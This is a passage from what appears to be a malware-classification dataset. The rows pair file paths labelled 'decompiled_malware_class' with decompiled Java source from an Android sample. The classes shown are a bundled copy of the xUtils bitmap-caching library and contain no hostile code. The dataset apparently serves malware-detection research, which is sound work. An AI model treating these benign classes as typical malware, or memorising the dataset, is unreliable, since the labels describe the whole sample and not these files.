} return objArr; } @Override public void onPostExecute(Object[] objArr){ if (BitmapGlobalConfig.this.bitmapCacheListener == null || objArr == null || objArr.length == 0) { return; } try { switch (((Integer)objArr[0]).intValue()) { case 0: BitmapGlobalConfig.this.bitmapCacheListener.onInitMemoryCacheFinished(); break; case 1: BitmapGlobalConfig.this.bitmapCacheListener.onInitDiskFinished(); break; case 2: BitmapGlobalConfig.this.bitmapCacheListener.onFlushCacheFinished(); break; case 3: BitmapGlobalConfig.this.bitmapCacheListener.onCloseCacheFinished(); break; case 4: BitmapGlobalConfig.this.bitmapCacheListener.onClearCacheFinished(); break; case 5: BitmapGlobalConfig.this.bitmapCacheListener.onClearMemoryCacheFinished(); break; case 6: BitmapGlobalConfig.this.bitmapCacheListener.onClearDiskCacheFinished(); break; case 7: if (objArr.length == 2) { BitmapGlobalConfig.this.bitmapCacheListener.onClearCacheFinished(String.valueOf(objArr[1])); break; } break; case 8: if (objArr.length == 2) { BitmapGlobalConfig.this.bitmapCacheListener.onClearMemoryCacheFinished(String.valueOf(objArr[1])); break; } break; case 9: if (objArr.length == 2) { BitmapGlobalConfig.this.bitmapCacheListener.onClearDiskCacheFinished(String.valueOf(objArr[1])); break; } break; } }  catch (Throwable th) { LogUtils.e(th.getMessage(),th); } } } private BitmapGlobalConfig(Context context,String str){ if (context == null) { throw new IllegalArgumentException(""context may not be null""); } this.mContext=context; this.diskCachePath=str; initBitmapCache(); } public static BitmapGlobalConfig getInstance(Context context,String str){ if (TextUtils.isEmpty(str)) { str=OtherUtils.getDiskCacheDir(context,""xBitmapCache""); } if (configMap.containsKey(str)) { return configMap.get(str); } BitmapGlobalConfig bitmapGlobalConfig=new BitmapGlobalConfig(context,str); configMap.put(str,bitmapGlobalConfig); return bitmapGlobalConfig; } private int getMemoryClass(){ return ((ActivityManager)this.mContext.getSystemService(""activity"")).getMemoryClass(); } private void initBitmapCache(){ new BitmapCacheManagementTask().execute(0); new BitmapCacheManagementTask().execute(1); } public void clearCache(){ new BitmapCacheManagementTask().execute(4); } public void clearCache(String str){ new BitmapCacheManagementTask().execute(7,str); } public void clearDiskCache(){ new BitmapCacheManagementTask().execute(6); } public void clearDiskCache(String str){ new BitmapCacheManagementTask().execute(9,str); } public void clearMemoryCache(){ new BitmapCacheManagementTask().execute(5); } public void clearMemoryCache(String str){ new BitmapCacheManagementTask().execute(8,str); } public void closeCache(){ new BitmapCacheManagementTask().execute(3); } public void flushCache(){ new BitmapCacheManagementTask().execute(2); } public BitmapCache getBitmapCache(){ if (this.bitmapCache == null) { this.bitmapCache=new BitmapCache(this); } return this.bitmapCache; } public BitmapCacheListener getBitmapCacheListener(){ return this.bitmapCacheListener; } public PriorityExecutor getBitmapLoadExecutor(){ return BITMAP_LOAD_EXECUTOR; } public long getDefaultCacheExpiry(){ return this.defaultCacheExpiry; } public int getDefaultConnectTimeout(){ return this.defaultConnectTimeout; } public int getDefaultReadTimeout(){ return this.defaultReadTimeout; } public PriorityExecutor getDiskCacheExecutor(){ return DISK_CACHE_EXECUTOR; } public String getDiskCachePath(){ return this.diskCachePath; } public int getDiskCacheSize(){ return this.diskCacheSize; } public Downloader getDownloader(){ if (this.downloader == null) { this.downloader=new DefaultDownloader(); } this.downloader.setContext(this.mContext); this.downloader.setDefaultExpiry(getDefaultCacheExpiry()); this.downloader.setDefaultConnectTimeout(getDefaultConnectTimeout()); this.downloader.setDefaultReadTimeout(getDefaultReadTimeout()); return this.downloader; } public FileNameGenerator getFileNameGenerator(){ return this.fileNameGenerator; } public int getMemoryCacheSize(){ return this.memoryCacheSize; } public int getThreadPoolSize(){ return BITMAP_LOAD_EXECUTOR.getPoolSize(); } public boolean isDiskCacheEnabled(){ return this.diskCacheEnabled; } public boolean isMemoryCacheEnabled(){ return this.memoryCacheEnabled; } public void setBitmapCacheListener(BitmapCacheListener bitmapCacheListener){ this.bitmapCacheListener=bitmapCacheListener; } public void setDefaultCacheExpiry(long j){ this.defaultCacheExpiry=j; } public void setDefaultConnectTimeout(int i){ this.defaultConnectTimeout=i; } public void setDefaultReadTimeout(int i){ this.defaultReadTimeout=i; } public void setDiskCacheEnabled(boolean z){ this.diskCacheEnabled=z; } public void setDiskCacheSize(int i){ if (i >= 10485760) { this.diskCacheSize=i; if (this.bitmapCache != null) { this.bitmapCache.setDiskCacheSize(this.diskCacheSize); } } } public void setDownloader(Downloader downloader){ this.downloader=downloader; } public void setFileNameGenerator(FileNameGenerator fileNameGenerator){ this.fileNameGenerator=fileNameGenerator; if (this.bitmapCache != null) { this.bitmapCache.setDiskCacheFileNameGenerator(fileNameGenerator); } } public void setMemCacheSizePercent(float f){ if (f < 0.05f || f > 0.8f) { throw new IllegalArgumentException(""percent must be between 0.05 and 0.8 (inclusive)""); } this.memoryCacheSize=Math.round(getMemoryClass() * f * 1024.0f* 1024.0f); if (this.bitmapCache != null) { this.bitmapCache.setMemoryCacheSize(this.memoryCacheSize); } } public void setMemoryCacheEnabled(boolean z){ this.memoryCacheEnabled=z; } public void setMemoryCacheSize(int i){ if (i < 2097152) { setMemCacheSizePercent(0.3f); return; } this.memoryCacheSize=i; if (this.bitmapCache != null) { this.bitmapCache.setMemoryCacheSize(this.memoryCacheSize); } } public void setThreadPoolSize(int i){ BITMAP_LOAD_EXECUTOR.setPoolSize(i); } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap\PauseOnScrollListener.code","public class PauseOnScrollListener implements AbsListView.OnScrollListener {   private final AbsListView.OnScrollListener externalListener;   private final boolean pauseOnFling;   private final boolean pauseOnScroll;   private TaskHandler taskHandler;   public PauseOnScrollListener(  TaskHandler taskHandler,  boolean z,  boolean z2){     this(taskHandler,z,z2,null);   }   public PauseOnScrollListener(  TaskHandler taskHandler,  boolean z,  boolean z2,  AbsListView.OnScrollListener onScrollListener){     this.taskHandler=taskHandler;     this.pauseOnScroll=z;     this.pauseOnFling=z2;     this.externalListener=onScrollListener;   }   @Override public void onScroll(  AbsListView absListView,  int i,  int i2,  int i3){     if (this.externalListener != null) {       this.externalListener.onScroll(absListView,i,i2,i3);     }   }   @Override public void onScrollStateChanged(  AbsListView absListView,  int i){ switch (i) { case 0:       this.taskHandler.resume();     break; case 1:   if (this.pauseOnScroll) {     this.taskHandler.pause();     break;   } break; case 2: if (this.pauseOnFling) { this.taskHandler.pause(); break; } break; } if (this.externalListener != null) { this.externalListener.onScrollStateChanged(absListView,i); } } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap.callback\BitmapLoadCallBack.code","public abstract class BitmapLoadCallBack<T extends View> {   private BitmapSetter<T> bitmapSetter;   public Drawable getDrawable(  T t){     return this.bitmapSetter != null ? this.bitmapSetter.getDrawable(t) : t instanceof ImageView ? ((ImageView)t).getDrawable() : t.getBackground();   }   public abstract void onLoadCompleted(  T t,  String str,  Bitmap bitmap,  BitmapDisplayConfig bitmapDisplayConfig,  BitmapLoadFrom bitmapLoadFrom);   public abstract void onLoadFailed(  T t,  String str,  Drawable drawable);   public void onLoadStarted(  T t,  String str,  BitmapDisplayConfig bitmapDisplayConfig){   }   public void onLoading(  T t,  String str,  BitmapDisplayConfig bitmapDisplayConfig,  long j,  long j2){   }   public void onPreLoad(  T t,  String str,  BitmapDisplayConfig bitmapDisplayConfig){   }   public void setBitmap(  T t,  Bitmap bitmap){     if (this.bitmapSetter != null) {       this.bitmapSetter.setBitmap(t,bitmap);     }  else     if (t instanceof ImageView) {       ((ImageView)t).setImageBitmap(bitmap);     }  else {       t.setBackgroundDrawable(new BitmapDrawable(t.getResources(),bitmap));     }   }   public void setBitmapSetter(  BitmapSetter<T> bitmapSetter){     this.bitmapSetter=bitmapSetter;   }   public void setDrawable(  T t,  Drawable drawable){     if (this.bitmapSetter != null) {       this.bitmapSetter.setDrawable(t,drawable);     }  else     if (t instanceof ImageView) {       ((ImageView)t).setImageDrawable(drawable);     }  else {       t.setBackgroundDrawable(drawable);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap.callback\BitmapSetter.code","public interface BitmapSetter<T extends View> {   Drawable getDrawable(  T t);   void setBitmap(  T t,  Bitmap bitmap);   void setDrawable(  T t,  Drawable drawable); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap.callback\DefaultBitmapLoadCallBack.code","public class DefaultBitmapLoadCallBack<T extends View> extends BitmapLoadCallBack<T> {   private void animationDisplay(  T t,  Animation animation){     try {       Method declaredMethod=Animation.class.getDeclaredMethod(""clone"",new Class[0]);       declaredMethod.setAccessible(true);       t.startAnimation((Animation)declaredMethod.invoke(animation,new Object[0]));     }  catch (    Throwable th) {       t.startAnimation(animation);     }   }   @Override public void onLoadCompleted(  T t,  String str,  Bitmap bitmap,  BitmapDisplayConfig bitmapDisplayConfig,  BitmapLoadFrom bitmapLoadFrom){     setBitmap(t,bitmap);     Animation animation=bitmapDisplayConfig.getAnimation();     if (animation != null) {       animationDisplay(t,animation);     }   }   @Override public void onLoadFailed(  T t,  String str,  Drawable drawable){     setDrawable(t,drawable);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap.core\AsyncDrawable.code","public class AsyncDrawable<T extends View> extends Drawable {   private final Drawable baseDrawable;   private final WeakReference<BitmapUtils.BitmapLoadTask<T>> bitmapLoadTaskReference;   public AsyncDrawable(  Drawable drawable,  BitmapUtils.BitmapLoadTask<T> bitmapLoadTask){     if (bitmapLoadTask == null) {       throw new IllegalArgumentException(""bitmapWorkerTask may not be null"");     }     this.baseDrawable=drawable;     this.bitmapLoadTaskReference=new WeakReference<>(bitmapLoadTask);   }   @Override public void clearColorFilter(){     if (this.baseDrawable != null) {       this.baseDrawable.clearColorFilter();     }   }   @Override public void draw(  Canvas canvas){     if (this.baseDrawable != null) {       this.baseDrawable.draw(canvas);     }   }   public BitmapUtils.BitmapLoadTask<T> getBitmapWorkerTask(){     return this.bitmapLoadTaskReference.get();   }   @Override public int getChangingConfigurations(){     if (this.baseDrawable == null) {       return 0;     }     return this.baseDrawable.getChangingConfigurations();   }   @Override public Drawable.ConstantState getConstantState(){     if (this.baseDrawable == null) {       return null;     }     return this.baseDrawable.getConstantState();   }   @Override public Drawable getCurrent(){     if (this.baseDrawable == null) {       return null;     }     return this.baseDrawable.getCurrent();   }   @Override public int getIntrinsicHeight(){     if (this.baseDrawable == null) {       return 0;     }     return this.baseDrawable.getIntrinsicHeight();   }   @Override public int getIntrinsicWidth(){     if (this.baseDrawable == null) {       return 0;     }     return this.baseDrawable.getIntrinsicWidth();   }   @Override public int getMinimumHeight(){     if (this.baseDrawable == null) {       return 0;     }     return this.baseDrawable.getMinimumHeight();   }   @Override public int getMinimumWidth(){     if (this.baseDrawable == null) {       return 0;     }     return this.baseDrawable.getMinimumWidth();   }   @Override public int getOpacity(){     if (this.baseDrawable == null) {       return 127;     }     return this.baseDrawable.getOpacity();   }   @Override public boolean getPadding(  Rect rect){     return this.baseDrawable != null && this.baseDrawable.getPadding(rect);   }   @Override public int[] getState(){     if (this.baseDrawable == null) {       return null;     }     return this.baseDrawable.getState();   }   @Override public Region getTransparentRegion(){     if (this.baseDrawable == null) {       return null;     }     return this.baseDrawable.getTransparentRegion();   }   @Override public void invalidateSelf(){     if (this.baseDrawable != null) {       this.baseDrawable.invalidateSelf();     }   }   @Override public boolean isStateful(){     return this.baseDrawable != null && this.baseDrawable.isStateful();   }   @Override public Drawable mutate(){     if (this.baseDrawable == null) {       return null;     }     return this.baseDrawable.mutate();   }   @Override public void scheduleSelf(  Runnable runnable,  long j){     if (this.baseDrawable != null) {       this.baseDrawable.scheduleSelf(runnable,j);     }   }   @Override public void setAlpha(  int i){     if (this.baseDrawable != null) {       this.baseDrawable.setAlpha(i);     }   }   @Override public void setBounds(  int i,  int i2,  int i3,  int i4){     if (this.baseDrawable != null) {       this.baseDrawable.setBounds(i,i2,i3,i4);     }   }   @Override public void setBounds(  Rect rect){     if (this.baseDrawable != null) {       this.baseDrawable.setBounds(rect);     }   }   @Override public void setChangingConfigurations(  int i){     if (this.baseDrawable != null) {       this.baseDrawable.setChangingConfigurations(i);     }   }   @Override public void setColorFilter(  int i,  PorterDuff.Mode mode){     if (this.baseDrawable != null) {       this.baseDrawable.setColorFilter(i,mode);     }   }   @Override public void setColorFilter(  ColorFilter colorFilter){     if (this.baseDrawable != null) {       this.baseDrawable.setColorFilter(colorFilter);     }   }   @Override public void setDither(  boolean z){     if (this.baseDrawable != null) {       this.baseDrawable.setDither(z);     }   }   @Override public void setFilterBitmap(  boolean z){     if (this.baseDrawable != null) {       this.baseDrawable.setFilterBitmap(z);     }   }   @Override public boolean setState(  int[] iArr){     return this.baseDrawable != null && this.baseDrawable.setState(iArr);   }   @Override public boolean setVisible(  boolean z,  boolean z2){     return this.baseDrawable != null && this.baseDrawable.setVisible(z,z2);   }   @Override public void unscheduleSelf(  Runnable runnable){     if (this.baseDrawable != null) {       this.baseDrawable.unscheduleSelf(runnable);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap.core\BitmapCache.code","public class BitmapCache {   private BitmapGlobalConfig globalConfig;   private LruDiskCache mDiskLruCache;   private LruMemoryCache<MemoryCacheKey,Bitmap> mMemoryCache;   private final int DISK_CACHE_INDEX=0;   private final Object mDiskCacheLock=new Object();   private volatile boolean isDiskCacheReady=false; public class BitmapMeta {     public byte[] data;     public long expiryTimestamp;     public FileInputStream inputStream;     private BitmapMeta(){     }   } public class MemoryCacheKey {     private String subKey;     private String uri;     private MemoryCacheKey(    String str,    BitmapDisplayConfig bitmapDisplayConfig){       this.uri=str;       this.subKey=bitmapDisplayConfig == null ? null : bitmapDisplayConfig.toString();     }     public boolean equals(    Object obj){       if (this == obj) {         return true;       }       if (!(obj instanceof MemoryCacheKey)) {         return false;       }       MemoryCacheKey memoryCacheKey=(MemoryCacheKey)obj;       if (!this.uri.equals(memoryCacheKey.uri)) {         return false;       }       if (this.subKey == null || memoryCacheKey.subKey == null) {         return true;       }       return this.subKey.equals(memoryCacheKey.subKey);     }     public int hashCode(){       return this.uri.hashCode();     }   }   public BitmapCache(  BitmapGlobalConfig bitmapGlobalConfig){     if (bitmapGlobalConfig == null) {       throw new IllegalArgumentException(""globalConfig may not be null"");     }     this.globalConfig=bitmapGlobalConfig;   }   private Bitmap addBitmapToMemoryCache(  String str,  BitmapDisplayConfig bitmapDisplayConfig,  Bitmap bitmap,  long j){     BitmapFactory bitmapFactory;     if (bitmapDisplayConfig != null && (bitmapFactory=bitmapDisplayConfig.getBitmapFactory()) != null) {       bitmap=bitmapFactory.cloneNew().createBitmap(bitmap);     }     if (str != null && bitmap != null && this.globalConfig.isMemoryCacheEnabled() && this.mMemoryCache != null) {       this.mMemoryCache.put(new MemoryCacheKey(str,bitmapDisplayConfig),bitmap,j);     }     return bitmap;   }   private Bitmap decodeBitmapMeta(  BitmapMeta bitmapMeta,  BitmapDisplayConfig bitmapDisplayConfig){     if (bitmapMeta == null) {       return null;     }     if (bitmapMeta.inputStream != null) {       return (bitmapDisplayConfig == null || bitmapDisplayConfig.isShowOriginal()) ? BitmapDecoder.decodeFileDescriptor(bitmapMeta.inputStream.getFD()) : BitmapDecoder.decodeSampledBitmapFromDescriptor(bitmapMeta.inputStream.getFD(),bitmapDisplayConfig.getBitmapMaxSize(),bitmapDisplayConfig.getBitmapConfig());     }     if (bitmapMeta.data != null) {       return (bitmapDisplayConfig == null || bitmapDisplayConfig.isShowOriginal()) ? BitmapDecoder.decodeByteArray(bitmapMeta.data) : BitmapDecoder.decodeSampledBitmapFromByteArray(bitmapMeta.data,bitmapDisplayConfig.getBitmapMaxSize(),bitmapDisplayConfig.getBitmapConfig());     }     return null;   }   private synchronized Bitmap rotateBitmapIfNeeded(  String str,  BitmapDisplayConfig bitmapDisplayConfig,  Bitmap bitmap){     File bitmapFileFromDiskCache;     int i=0; synchronized (this) {       if (bitmapDisplayConfig != null) {         if (bitmapDisplayConfig.isAutoRotation() && (bitmapFileFromDiskCache=getBitmapFileFromDiskCache(str)) != null && bitmapFileFromDiskCache.exists()) {           try { switch (new ExifInterface(bitmapFileFromDiskCache.getPath()).getAttributeInt(""Orientation"",0)) { case 3:               i=180;             break; case 6:           i=90;         break; case 8:       i=270;     break; } if (i != 0) {   Matrix matrix=new Matrix();   matrix.postRotate(i);   Bitmap createBitmap=Bitmap.createBitmap(bitmap,0,0,bitmap.getWidth(),bitmap.getHeight(),matrix,true);   bitmap.recycle();   bitmap=createBitmap; } }  catch (Throwable th) { } } } } return bitmap; } public void clearCache(){ clearMemoryCache(); clearDiskCache(); } public void clearCache(String str){ clearMemoryCache(str); clearDiskCache(str); } public void clearDiskCache(){ synchronized (this.mDiskCacheLock) { this.isDiskCacheReady=false; if (this.mDiskLruCache != null && !this.mDiskLruCache.isClosed()) { try { this.mDiskLruCache.delete(); }  catch (Throwable th) { LogUtils.e(th.getMessage(),th); } this.mDiskLruCache=null; } } initDiskCache(); } public void clearDiskCache(String str){ synchronized (this.mDiskCacheLock) { if (this.mDiskLruCache != null && !this.mDiskLruCache.isClosed()) { try { this.mDiskLruCache.remove(str); }  catch (Throwable th) { LogUtils.e(th.getMessage(),th); } } } } public void clearMemoryCache(){ if (this.mMemoryCache != null) { this.mMemoryCache.evictAll(); } } public void clearMemoryCache(String str){ MemoryCacheKey memoryCacheKey=new MemoryCacheKey(str,null); if (this.mMemoryCache != null) { while (this.mMemoryCache.containsKey(memoryCacheKey)) { this.mMemoryCache.remove(memoryCacheKey); } } } public void close(){ synchronized (this.mDiskCacheLock) { this.isDiskCacheReady=false; if (this.mDiskLruCache != null) { try { if (!this.mDiskLruCache.isClosed()) { this.mDiskLruCache.close(); this.mDiskLruCache=null; } }  catch (Throwable th) { LogUtils.e(th.getMessage(),th); } } } } public android.graphics.Bitmap downloadBitmap(java.lang.String r14,com.fw.tzthree.lidroid.xutils.bitmap.BitmapDisplayConfig r15,com.fw.tzthree.lidroid.xutils.BitmapUtils.BitmapLoadTask<?> r16){ throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.lidroid.xutils.bitmap.core.BitmapCache.downloadBitmap(java.lang.String, com.fw.tzthree.lidroid.xutils.bitmap.BitmapDisplayConfig, com.fw.tzthree.lidroid.xutils.BitmapUtils$BitmapLoadTask):android.graphics.Bitmap""); } public void flush(){ synchronized (this.mDiskCacheLock) { if (this.mDiskLruCache != null) { try { this.mDiskLruCache.flush(); }  catch (Throwable th) { LogUtils.e(th.getMessage(),th); } } } } public File getBitmapFileFromDiskCache(String str){ if (this.mDiskLruCache != null) { return this.mDiskLruCache.getCacheFile(str,0); } return null; } public Bitmap getBitmapFromDiskCache(String str,BitmapDisplayConfig bitmapDisplayConfig){ LruDiskCache.Snapshot snapshot; LruDiskCache.Snapshot snapshot2; Bitmap decodeSampledBitmapFromDescriptor; if (str == null || !this.globalConfig.isDiskCacheEnabled()) { return null; } synchronized (this.mDiskCacheLock) { while (!this.isDiskCacheReady) { try { this.mDiskCacheLock.wait(); }  catch (Throwable th) { } } } if (this.mDiskLruCache != null) { try { snapshot=this.mDiskLruCache.get(str); if (snapshot != null) { if (bitmapDisplayConfig != null) { try {   if (!bitmapDisplayConfig.isShowOriginal()) {     decodeSampledBitmapFromDescriptor=BitmapDecoder.decodeSampledBitmapFromDescriptor(snapshot.getInputStream(0).getFD(),bitmapDisplayConfig.getBitmapMaxSize(),bitmapDisplayConfig.getBitmapConfig());     Bitmap addBitmapToMemoryCache=addBitmapToMemoryCache(str,bitmapDisplayConfig,rotateBitmapIfNeeded(str,bitmapDisplayConfig,decodeSampledBitmapFromDescriptor),this.mDiskLruCache.getExpiryTimestamp(str));     IOUtils.closeQuietly(snapshot);     return addBitmapToMemoryCache;   } }  catch (Throwable th2) {   th=th2;   snapshot2=snapshot;   try {     LogUtils.e(th.getMessage(),th);     IOUtils.closeQuietly(snapshot2);     return null;   }  catch (  Throwable th3) {     th=th3;     snapshot=snapshot2;     IOUtils.closeQuietly(snapshot);     throw th;   } } } decodeSampledBitmapFromDescriptor=BitmapDecoder.decodeFileDescriptor(snapshot.getInputStream(0).getFD()); Bitmap addBitmapToMemoryCache2=addBitmapToMemoryCache(str,bitmapDisplayConfig,rotateBitmapIfNeeded(str,bitmapDisplayConfig,decodeSampledBitmapFromDescriptor),this.mDiskLruCache.getExpiryTimestamp(str)); IOUtils.closeQuietly(snapshot); return addBitmapToMemoryCache2; } IOUtils.closeQuietly(snapshot); }  catch (Throwable th4) { th=th4; snapshot=null; } } return null; } public Bitmap getBitmapFromMemCache(String str,BitmapDisplayConfig bitmapDisplayConfig){ if (this.mMemoryCache == null || !this.globalConfig.isMemoryCacheEnabled()) { return null; } return this.mMemoryCache.get(new MemoryCacheKey(str,bitmapDisplayConfig)); } public void initDiskCache(){ synchronized (this.mDiskCacheLock) { if (this.globalConfig.isDiskCacheEnabled()) { File file=new File(this.globalConfig.getDiskCachePath()); if (file.exists() || file.mkdirs()) { long availableSpace=OtherUtils.getAvailableSpace(file); long diskCacheSize=this.globalConfig.getDiskCacheSize(); if (availableSpace <= diskCacheSize) { diskCacheSize=availableSpace; } try { this.mDiskLruCache=LruDiskCache.open(file,1,1,diskCacheSize); this.mDiskLruCache.setFileNameGenerator(this.globalConfig.getFileNameGenerator()); }  catch (Throwable th) { this.mDiskLruCache=null; LogUtils.e(th.getMessage(),th); } } } this.isDiskCacheReady=true; this.mDiskCacheLock.notifyAll(); } } public void initMemoryCache(){ if (this.globalConfig.isMemoryCacheEnabled()) { if (this.mMemoryCache != null) { try { clearMemoryCache(); }  catch (Throwable th) { } } this.mMemoryCache=new LruMemoryCache<MemoryCacheKey,Bitmap>(this.globalConfig.getMemoryCacheSize()){ @Override public int sizeOf(MemoryCacheKey memoryCacheKey,Bitmap bitmap){ if (bitmap == null) { return 0; } return bitmap.getRowBytes() * bitmap.getHeight(); } } ; } } public void setDiskCacheFileNameGenerator(FileNameGenerator fileNameGenerator){ if (this.mDiskLruCache == null || fileNameGenerator == null) { return; } this.mDiskLruCache.setFileNameGenerator(fileNameGenerator); } public void setDiskCacheSize(int i){ if (this.mDiskLruCache != null) { this.mDiskLruCache.setMaxSize(i); } } public void setMemoryCacheSize(int i){ if (this.mMemoryCache != null) { this.mMemoryCache.setMaxSize(i); } } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap.core\BitmapDecoder.code","public class BitmapDecoder {   private static final Object lock=new Object();   private BitmapDecoder(){   }   public static int calculateInSampleSize(  BitmapFactory.Options options,  int i,  int i2){     int i3=options.outHeight;     int i4=options.outWidth;     int i5=1;     if (i4 > i || i3 > i2) {       i5=i4 > i3 ? Math.round(i3 / i2) : Math.round(i4 / i);       while ((i3 * i4) / (i5 * i5) > i * i2 * 2) {         i5++;       }     }     return i5;   }   public static Bitmap decodeByteArray(  byte[] bArr){     Bitmap bitmap; synchronized (lock) {       BitmapFactory.Options options=new BitmapFactory.Options();       options.inPurgeable=true;       options.inInputShareable=true;       try {         bitmap=BitmapFactory.decodeByteArray(bArr,0,bArr.length,options);       }  catch (      Throwable th) {         LogUtils.e(th.getMessage(),th);         bitmap=null;       }     }     return bitmap;   }   public static Bitmap decodeFile(  String str){     Bitmap bitmap; synchronized (lock) {       BitmapFactory.Options options=new BitmapFactory.Options();       options.inPurgeable=true;       options.inInputShareable=true;       try {         bitmap=BitmapFactory.decodeFile(str,options);       }  catch (      Throwable th) {         LogUtils.e(th.getMessage(),th);         bitmap=null;       }     }     return bitmap;   }   public static Bitmap decodeFileDescriptor(  FileDescriptor fileDescriptor){     Bitmap bitmap=null; synchronized (lock) {       BitmapFactory.Options options=new BitmapFactory.Options();       options.inPurgeable=true;       options.inInputShareable=true;       try {         bitmap=BitmapFactory.decodeFileDescriptor(fileDescriptor,null,options);       }  catch (      Throwable th) {         LogUtils.e(th.getMessage(),th);       }     }     return bitmap;   }   public static Bitmap decodeResource(  Resources resources,  int i){     Bitmap bitmap; synchronized (lock) {       BitmapFactory.Options options=new BitmapFactory.Options();       options.inPurgeable=true;       options.inInputShareable=true;       try {         bitmap=BitmapFactory.decodeResource(resources,i,options);       }  catch (      Throwable th) {         LogUtils.e(th.getMessage(),th);         bitmap=null;       }     }     return bitmap;   }   public static Bitmap decodeSampledBitmapFromByteArray(  byte[] bArr,  BitmapSize bitmapSize,  Bitmap.Config config){     Bitmap bitmap; synchronized (lock) {       BitmapFactory.Options options=new BitmapFactory.Options();       options.inJustDecodeBounds=true;       options.inPurgeable=true;       options.inInputShareable=true;       BitmapFactory.decodeByteArray(bArr,0,bArr.length,options);       options.inSampleSize=calculateInSampleSize(options,bitmapSize.getWidth(),bitmapSize.getHeight());       options.inJustDecodeBounds=false;       if (config != null) {         options.inPreferredConfig=config;       }       try {         bitmap=BitmapFactory.decodeByteArray(bArr,0,bArr.length,options);       }  catch (      Throwable th) {         LogUtils.e(th.getMessage(),th);         bitmap=null;       }     }     return bitmap;   }   public static Bitmap decodeSampledBitmapFromDescriptor(  FileDescriptor fileDescriptor,  BitmapSize bitmapSize,  Bitmap.Config config){     Bitmap bitmap=null; synchronized (lock) {       BitmapFactory.Options options=new BitmapFactory.Options();       options.inJustDecodeBounds=true;       options.inPurgeable=true;       options.inInputShareable=true;       BitmapFactory.decodeFileDescriptor(fileDescriptor,null,options);       options.inSampleSize=calculateInSampleSize(options,bitmapSize.getWidth(),bitmapSize.getHeight());       options.inJustDecodeBounds=false;       if (config != null) {         options.inPreferredConfig=config;       }       try {         bitmap=BitmapFactory.decodeFileDescriptor(fileDescriptor,null,options);       }  catch (      Throwable th) {         LogUtils.e(th.getMessage(),th);       }     }     return bitmap;   }   public static Bitmap decodeSampledBitmapFromFile(  String str,  BitmapSize bitmapSize,  Bitmap.Config config){     Bitmap bitmap; synchronized (lock) {       BitmapFactory.Options options=new BitmapFactory.Options();       options.inJustDecodeBounds=true;       options.inPurgeable=true;       options.inInputShareable=true;       BitmapFactory.decodeFile(str,options);       options.inSampleSize=calculateInSampleSize(options,bitmapSize.getWidth(),bitmapSize.getHeight());       options.inJustDecodeBounds=false;       if (config != null) {         options.inPreferredConfig=config;       }       try {         bitmap=BitmapFactory.decodeFile(str,options);       }  catch (      Throwable th) {         LogUtils.e(th.getMessage(),th);         bitmap=null;       }     }     return bitmap;   }   public static Bitmap decodeSampledBitmapFromResource(  Resources resources,  int i,  BitmapSize bitmapSize,  Bitmap.Config config){     Bitmap bitmap; synchronized (lock) {       BitmapFactory.Options options=new BitmapFactory.Options();       options.inJustDecodeBounds=true;       options.inPurgeable=true;       options.inInputShareable=true;       BitmapFactory.decodeResource(resources,i,options);       options.inSampleSize=calculateInSampleSize(options,bitmapSize.getWidth(),bitmapSize.getHeight());       options.inJustDecodeBounds=false;       if (config != null) {         options.inPreferredConfig=config;       }       try {         bitmap=BitmapFactory.decodeResource(resources,i,options);       }  catch (      Throwable th) {         LogUtils.e(th.getMessage(),th);         bitmap=null;       }     }     return bitmap;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap.core\BitmapMeta.code","public class BitmapMeta {   public byte[] data;   public long expiryTimestamp;   public FileInputStream inputStream;   private BitmapMeta(){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap.core\BitmapSize.code","public class BitmapSize {   public static final BitmapSize ZERO=new BitmapSize(0,0);   private final int height;   private final int width;   public BitmapSize(  int i,  int i2){     this.width=i;     this.height=i2;   }   public int getHeight(){     return this.height;   }   public int getWidth(){     return this.width;   }   public BitmapSize scale(  float f){     return new BitmapSize((int)(this.width * f),(int)(this.height * f));   }   public BitmapSize scaleDown(  int i){     return new BitmapSize(this.width / i,this.height / i);   }   public String toString(){     return ""_"" + this.width + ""_""+ this.height;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap.core\MemoryCacheKey.code","public class MemoryCacheKey {   private String subKey;   private String uri;   private MemoryCacheKey(  String str,  BitmapDisplayConfig bitmapDisplayConfig){     this.uri=str;     this.subKey=bitmapDisplayConfig == null ? null : bitmapDisplayConfig.toString();   }   public boolean equals(  Object obj){     if (this == obj) {       return true;     }     if (!(obj instanceof MemoryCacheKey)) {       return false;     }     MemoryCacheKey memoryCacheKey=(MemoryCacheKey)obj;     if (!this.uri.equals(memoryCacheKey.uri)) {       return false;     }     if (this.subKey == null || memoryCacheKey.subKey == null) {       return true;     }     return this.subKey.equals(memoryCacheKey.subKey);   }   public int hashCode(){     return this.uri.hashCode();   } } "
